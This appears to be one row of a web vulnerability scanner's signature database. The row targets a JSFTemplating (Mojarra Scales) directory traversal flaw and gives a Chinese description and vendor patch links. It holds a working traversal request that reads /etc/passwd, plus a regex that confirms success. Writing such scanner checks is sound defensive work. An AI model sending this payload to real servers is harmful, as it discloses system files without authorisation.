INSERT INTO `cgidb` VALUES ('7484', null, '信息泄露', '/scales_static_resource.jsf?file=../../../../../../etc/passwd', 'GET', '/bin/(bash|sh)[^\\r\\n<>]*[\\r\\n]', '3', null, null, null, null, 'JSFTemplating（Templating for JavaServer Faces Technology）是用于简化创建页面和组件工作的模板。\r\n\r\nJSFTemplating在实现FileStreamer功能时没有正确地限制对文件的访问，远程攻击者可以通过目录遍历攻击检索服务器上的任意文件或目录。', null, null, '1', '7240', '厂商补丁：\r\nhttp://download.java.net/maven/1/com.sun.jsftemplating/jars/\r\nhttps://jsftemplating.dev.java.net/servlets/BrowseList?listName=cvs&by=date&from=2009-08-01&to=2009-08-31&first=1&count=16\r\nhttp://kenai.com/projects/scales/downloads/directory/Mojarra%20Scales%201.3.2/');
